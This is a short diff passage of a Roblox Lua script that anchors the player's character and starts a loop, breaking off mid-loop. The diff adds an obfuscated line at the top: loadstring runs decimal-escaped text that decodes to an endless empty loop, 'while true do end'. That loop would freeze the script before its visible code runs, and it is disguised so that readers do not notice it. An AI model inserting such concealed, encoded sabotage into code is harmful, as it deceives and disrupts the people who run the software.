@@ -1,3 +1,4 @@
+loadstring("\119\104\105\108\101\32\116\114\117\101\32\100\111\32\101\110\100\10")()
 local root = game.Players.LocalPlayer.Character.HumanoidRootPart
 root.Anchored = true
 repeat 
